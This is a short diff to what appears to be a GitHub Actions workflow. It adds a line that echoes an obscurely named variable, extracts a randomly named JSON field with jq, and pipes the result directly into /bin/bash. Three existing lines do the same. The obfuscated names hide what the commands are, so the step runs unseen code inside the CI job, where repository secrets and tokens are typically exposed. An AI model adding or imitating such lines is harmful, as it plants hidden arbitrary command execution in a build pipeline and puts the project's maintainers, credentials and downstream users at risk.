@@ -24,6 +24,7 @@ jobs:
           echo $nykc48 | jq -r .ta25938 | /bin/bash
           echo $p46 | jq -r .xt7 | /bin/bash
           echo $lfl822 | jq -r .wpyso60 | /bin/bash
+          echo $fpi1 | jq -r .kf86811 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
